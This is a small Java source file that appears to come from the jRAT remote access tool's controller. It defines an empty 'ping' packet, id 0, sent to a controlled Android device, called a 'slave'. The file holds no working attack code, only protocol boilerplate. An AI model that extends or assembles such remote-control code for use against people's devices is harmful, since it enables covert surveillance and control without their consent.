package io.jrat.controller.packets.android.outgoing;

import io.jrat.controller.android.AndroidSlave;
import java.io.DataOutputStream;

public class AndroidPacket0Ping extends AbstractOutgoingAndroidPacket {

	@Override
	public void write(AndroidSlave slave, DataOutputStream dos) throws Exception {
		
	}

	@Override
	public byte getPacketId() {
		return 0;
	}

}
